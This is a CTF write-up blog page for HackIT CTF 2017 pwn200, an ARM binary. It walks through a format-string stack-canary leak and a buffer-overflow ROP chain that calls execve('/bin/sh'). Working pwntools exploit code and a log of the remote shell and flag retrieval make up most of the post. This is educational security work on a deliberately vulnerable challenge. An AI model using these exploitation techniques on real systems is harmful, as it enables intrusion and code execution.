@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>HackIT CTF 2017 - pwn200 | kileak</title>
+
+
+
+
+
+<meta name="description" content="HackIT CTF 2017 - pwn200">
+
+
+<meta name="keywords" content="HackIT">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/HackIT-pwn200/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">HackIT CTF 2017 - pwn200</h1>
+      <p class="post-meta">Aug 25, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>pn200 (200) - ARM format string / rop
+<!--break--></p>
+
+  <p>Description: The terminator canary has blocked this path. Find a way to bypass it.
+165.227.98.55:3333, 165.227.98.55:7777</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/hackit17pwn200/pwn200">pwn200</a> <a href="https://kileak.github.io/assets/hackit17pwn200/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">pwn200: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, not stripped</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] checksec for '/home/pi/hackit/pwn200/pwn200'
+Canary                        : Yes
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial</code></pre></figure>
+
+<p>The challenge this time is an arm binary, which let’s us input two strings (CHECK and FIGHT).</p>
+
+<p>After disassembling the code for the binary might look like this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Terminator canary blocks the way!"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"CHECK&gt; "</span><span class="p">);</span>
+    <span class="n">check</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"I need your clothes, your boots and your motorcycle."</span><span class="p">);</span>
+    <span class="n">fight</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Stay determined..."</span><span class="p">);</span>    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">2048</span><span class="p">]</span>
+    <span class="n">_isoc99_scanf</span><span class="p">(</span><span class="s">"%2048s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">fight</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> 
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> 
+    <span class="kt">int</span> <span class="n">canary</span><span class="p">;</span>  
+
+    <span class="n">canary</span> <span class="o">=</span> <span class="n">_stack_chk_guard</span><span class="p">;</span> 
+
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span> 
+    <span class="n">result</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span> 
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">canary</span> <span class="o">!=</span> <span class="n">_stack_chk_guard</span> <span class="p">)</span>
+        <span class="n">_stack_chk_fail</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Obviously, there’s a format string vulnerability in <code class="language-plaintext highlighter-rouge">check()</code> and <code class="language-plaintext highlighter-rouge">fight()</code> is prone to a buffer overflow. But there’s a canary check, which prevents us from abusing the overflow (for now).</p>
+
+<p>So, we should first try to leak the canary. The format string vuln will help with that. Though, it uses <code class="language-plaintext highlighter-rouge">scanf</code> to read our input, so no null bytes are allowed. Since the canary is stored at <code class="language-plaintext highlighter-rouge">0x00098f8c</code>, we cannot pass it in our payload to put the address onto the stack and then read from it.</p>
+
+<p>We also have only one shot with our format string, so we cannot put it on the stack with the first payload and read it with another one.</p>
+
+<p>This means, we have to reuse the existing addresses on the stack. To make it easier to find appropriate format string parameters, I wrote a quick&amp;dirty scanner (disable ASLR before running it locally)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">scan</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn200"</span><span class="p">)</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CHECK&gt; "</span><span class="p">)</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"AAAA%%%d$p"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+                <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+                <span class="k">if</span> <span class="ow">not</span> <span class="s">"(nil)"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+                    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%d =&gt; %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">resp</span><span class="p">))</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">continue</span></code></pre></figure>
+
+<p>This will produce an output file, which can then be used, to search the available addresses in an editor and eases the pain to check every parameter. One could also parse the responses to make the output look a little bit nicer, but it should suffice for a ctf challenge.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">2 =&gt; AAAA0x9a3fcI need your clothes, your boots and your motorcycle.
+3 =&gt; AAAA0x7effea1cI need your clothes, your boots and your motorcycle.
+5 =&gt; AAAA0x41414141I need your clothes, your boots and your motorcycle.
+6 =&gt; AAAA0x70243625I need your clothes, your boots and your motorcycle.
+...</code></pre></figure>
+
+<p>Setting a breakpoint to <code class="language-plaintext highlighter-rouge">main+152</code> will show us the stack address, at which the return address is stored (if we think in x86 terms)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">----------------------------------------------------------------------------------------------------------[ code:armv4t ]----
+      0x10680 &lt;main+128&gt;       add    r3,  pc,  r3
+      0x10684 &lt;main+132&gt;       mov    r0,  r3
+      0x10688 &lt;main+136&gt;       bl     0x17908 &lt;puts&gt;
+      0x1068c &lt;main+140&gt;       mov    r3,  #0
+      0x10690 &lt;main+144&gt;       mov    r0,  r3
+      0x10694 &lt;main+148&gt;       sub    sp,  r11,  #8
+ -&gt;   0x10698 &lt;main+152&gt;       pop    {r4,  r11,  lr}
+      0x1069c &lt;main+156&gt;       bx     lr
+      0x106a0 &lt;main+160&gt;       andeq  r8,  r8,  r0,  ror #19
+      0x106a4 &lt;main+164&gt;       andeq  r2,  r6,  r12,  ror r10
+      0x106a8 &lt;main+168&gt;       andeq  r0,  r0,  r8,  lsl r0
+      0x106ac &lt;main+172&gt;       andeq  r2,  r6,  r8,  ror r10
+----------------------------------------------------------------------------------------------------------------[ stack ]----
+0x7efff23c|+0x00: 0x7efff258 -&gt; 0xad280609	&lt;-$sp
+0x7efff240|+0x04: 0x00000000
+0x7efff244|+0x08: 0x00010950 &lt;== lr
+0x7efff248|+0x0c: 0x00000000
+0x7efff24c|+0x10: 0x00000001</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">0x7efff244</code> holds the return address (<code class="language-plaintext highlighter-rouge">lr</code> gets called on next instruction by <code class="language-plaintext highlighter-rouge">bx lr</code>). Let’s do a quick search in the output file for <code class="language-plaintext highlighter-rouge">0x7efff244</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="mi">460</span> <span class="o">=&gt;</span> <span class="n">AAAA0x7efff244I</span> <span class="n">need</span> <span class="n">your</span> <span class="n">clothes</span><span class="p">,</span> <span class="n">your</span> <span class="n">boots</span> <span class="ow">and</span> <span class="n">your</span> <span class="n">motorcycle</span><span class="p">.</span></code></pre></figure>
+
+<p>Ok, the 460th format string parameter points to that address, so we can use it to overwrite the return address and get <code class="language-plaintext highlighter-rouge">pc</code> control.</p>
+
+<p>Let’s point it back to the start of <code class="language-plaintext highlighter-rouge">main</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite RET to start infinite loop"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%%%du%%460$n"</span> <span class="o">%</span> <span class="mh">0x10600</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>This will result in an endless loop:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CHECK&gt; $ a
+aI need your clothes, your boots and your motorcycle.
+FIGHT&gt; $ a
+Stay determined...
+Terminator canary blocks the way!
+CHECK&gt; $ a
+aI need your clothes, your boots and your motorcycle.
+FIGHT&gt; $ a
+Stay determined...
+Terminator canary blocks the way!
+CHECK&gt; $  </code></pre></figure>
+
+<p>Ok, much more comfortable :)</p>
+
+<p>We might now be able to just put the address on the canary by sending a 4 byte aligned string with the canary address at the end, and then read it with the second check call, but I decided to use two combined format strings for this.</p>
+
+<p>For this, just stop again in the check-function and search the memory, where the format string parameters are located</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">...
+0x7efff214:	0x00000000	0x00000000	0x4090b100	0x00073108
+0x7efff224:	0x00099000	0x7efff244	0x0001067c	0x00000000
+0x7efff234:	0x00000000	0x00000000	0x7efff258	0x00000000  &lt;-- Stack address
+0x7efff244:	0x00010600	0x00000000	0x00000001	0x7efff394
+0x7efff254:	0x00010600	0xca5e1122	0xb4a0ea7a	0x00098f8c  &lt;-- pointing to second dword 
+0x7efff264:	0x00000000	0x00010e10	0x00000000	0x00000000
+0x7efff274:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7efff284:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7efff294:	0x00000000	0x00000000	0x00000000	0x00000000
+...</code></pre></figure>
+
+<p>And there’s a <code class="language-plaintext highlighter-rouge">0x7efff258</code>, which points to another format string param. Searching <code class="language-plaintext highlighter-rouge">0x7efff258</code> in the output file, reveals that it’s number <code class="language-plaintext highlighter-rouge">525</code> and it’s pointing to <code class="language-plaintext highlighter-rouge">532</code>. So we’ll be storing the address of the canary with parameter <code class="language-plaintext highlighter-rouge">525</code> and then read it with <code class="language-plaintext highlighter-rouge">532</code>.</p>
+
+<p>Keep in mind, that the lowest byte of the canary will be <code class="language-plaintext highlighter-rouge">0x0</code>, so we’ll read just one byte higher and then append the <code class="language-plaintext highlighter-rouge">0x0</code> byte later on.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write canary address to stack (Parameter 525 =&gt; 532)"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CHECK&gt; "</span><span class="p">)</span>
+  
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%%%du%%525$n"</span> <span class="o">%</span> <span class="p">(</span><span class="n">CANARYADDR</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+<span class="n">recvMult</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">CANARYADDR</span> <span class="o">+</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># receive junk
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">()</span>                <span class="c1"># skip fight
+</span>    
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Read canary from parameter 532"</span><span class="p">)</span>  
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CHECK&gt; "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%532$s"</span><span class="p">)</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Canary          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Overwrite RET to start infinite loop
+[*] Write canary address to stack
+[*] Read canary
+[*] Canary           : 0x46998500</code></pre></figure>
+
+<p>Now that we’re able to leak the canary, we can continue with the buffer overflow in the <code class="language-plaintext highlighter-rouge">fight()</code> function. We’ll be using it to call <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code>, so we’d need <code class="language-plaintext highlighter-rouge">/bin/sh</code> somewhere in memory, but the binary doesn’t contain any occurence of this.</p>
+
+<p>We can just put it at the beginning of our payload, though we’ll need the address to our payload then. For this, we can just leak a stack address first and then calculate the offset to our payload. Parameter 3 contains the address of the buffer used in <code class="language-plaintext highlighter-rouge">check</code>, and the buffer in <code class="language-plaintext highlighter-rouge">fight</code> will be 0x400 bytes behind that.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Read stack address from parameter 3 to calculate payload address"</span><span class="p">)</span>  
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CHECK&gt; "</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%3$p"</span><span class="p">)</span>
+
+<span class="n">STACKLEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">10</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">PAYLOADADDR</span> <span class="o">=</span> <span class="n">STACKLEAK</span> <span class="o">+</span> <span class="mh">0x400</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Payload address : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PAYLOADADDR</span><span class="p">))</span></code></pre></figure>
+
+<p>Since the binary is statically linked and doesn’t contain any references to <code class="language-plaintext highlighter-rouge">execve</code> or <code class="language-plaintext highlighter-rouge">system</code>, we’ll have to use rop to call <code class="language-plaintext highlighter-rouge">execve</code> via syscall.</p>
+
+<p>We’ll be in thumb mode, when our payload will be executed, so for calling execve we have to fill our registers:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r7    = 0x0b   (execve) / r0    = filename / r1    = argv / r2    = env
+</code></pre></div></div>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">Plog</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overflow buffer to execute execve('/bin/sh', 0, 0)"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"FIGHT&gt; "</span><span class="p">)</span>
+
+<span class="n">POPR7LR</span> <span class="o">=</span> <span class="mh">0x19d20</span>
+<span class="n">POPR0LR</span> <span class="o">=</span> <span class="mh">0x70068</span>
+<span class="n">POPR1LR</span> <span class="o">=</span> <span class="mh">0x70590</span>
+<span class="n">POPR1R2LR</span> <span class="o">=</span> <span class="mh">0x6f9b0</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x000553b8</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mi">1024</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>  
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">12</span> 
+
+<span class="c1"># execve("/bin/sh", 0, 0) 
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPR7LR</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPR0LR</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">PAYLOADADDR</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPR1R2LR</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python xpl.py 1
+
+<span class="o">[</span>+] Opening connection to 165.227.98.55 on port 7777: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Overwrite RET with <span class="s1">'jump to main'</span> to enter infinite loop
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Write canary address to stack <span class="o">(</span>Parameter 525 <span class="o">=&gt;</span> 532<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Read canary from parameter 532
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Canary          : 0x75384c00
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Read stack address from parameter 3 to calculate payload address
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload address : 0xbea5d86c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Overflow buffer to execute execve<span class="o">(</span><span class="s1">'/bin/sh'</span>, 0, 0<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+
+<span class="nv">$ </span><span class="nb">whoami
+</span>pwn200
+<span class="nv">$ </span><span class="nb">cat</span> /home/pwn200/flag.txt
+h4ck1t<span class="o">{</span>Sarah_would_be_proud<span class="o">}</span></code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=HackIT CTF 2017 - pwn200&amp;url=https://kileak.github.io/ctf/2017/HackIT-pwn200/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/HackIT-pwn200/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/HackIT-pwn200';
+        var disqus_title = 'HackIT CTF 2017 - pwn200';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/HackIT-pwn200';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
